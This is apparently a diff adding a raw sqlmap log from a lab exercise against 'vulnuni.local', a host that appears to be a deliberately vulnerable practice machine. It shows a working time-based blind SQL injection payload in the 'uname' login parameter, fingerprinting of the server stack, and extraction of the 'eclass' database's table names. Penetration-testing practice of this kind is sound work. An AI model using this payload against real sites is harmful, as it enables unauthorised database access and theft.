@@ -1,0 +1,94 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.10#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:35:22 /2026-02-20/
+
+[10:35:22] [INFO] parsing HTTP request from '/home/kali/Desktop/login_request.txt'
+[10:35:22] [INFO] resuming back-end DBMS 'mysql' 
+[10:35:22] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=test' AND (SELECT 2927 FROM (SELECT(SLEEP(5)))lyCd)-- Atif&pass=test&submit=Enter
+---
+[10:35:22] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 12.10 or 13.04 or 12.04 (Precise Pangolin or Raring Ringtail or Quantal Quetzal)
+web application technology: PHP 5.3.10, Apache 2.2.22
+back-end DBMS: MySQL >= 5.0.12
+[10:35:22] [INFO] fetching tables for database: 'eclass'
+[10:35:22] [INFO] fetching number of tables for database 'eclass'
+
+[10:35:22] [INFO] retrieved: [10:35:22] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
+[10:35:25] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+1
+[10:35:40] [INFO] adjusting time delay to 2 seconds due to good response times
+6
+
+[10:35:42] [INFO] retrieved: admin
+
+[10:36:11] [INFO] retrieved: annonces
+
+[10:37:00] [INFO] retrieved: cours
+
+[10:37:33] [INFO] retrieved: cours_faculte
+
+[10:38:37] [INFO] retrieved: cours_user
+
+[10:39:14] [INFO] retrieved: faculte
+
+[10:39:55] [INFO] retrieved: in
+[10:40:31] [ERROR] invalid character detected. retrying..
+[10:40:31] [WARNING] increasing time delay to 3 seconds
+stitution
+
+[10:42:03] [INFO] retrieved: loginout
+
+[10:43:31] [INFO] retrieved: pma_bookmark
+
+[10:45:33] [INFO] retrieved: pma_column_comments
+
+[10:48:27] [INFO] retrieved: pma_pdf_pages
+
+[10:50:20] [INFO] retrieved: pma_relation
+
+[10:51:49] [INFO] retrieved: pma_table_coords
+
+[10:54:03] [INFO] retrieved: pma_table_info
+
+[10:55:16] [INFO] retrieved: prof_request
+
+[10:57:09] [INFO] retrieved: user
+Database: eclass
+[16 tables]
++---------------------+
+| admin               |
+| user                |
+| annonces            |
+| cours               |
+| cours_faculte       |
+| cours_user          |
+| faculte             |
+| institution         |
+| loginout            |
+| pma_bookmark        |
+| pma_column_comments |
+| pma_pdf_pages       |
+| pma_relation        |
+| pma_table_coords    |
+| pma_table_info      |
+| prof_request        |
++---------------------+
+
+[10:57:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vulnuni.local'
+
+[*] ending @ 10:57:46 /2026-02-20/
+
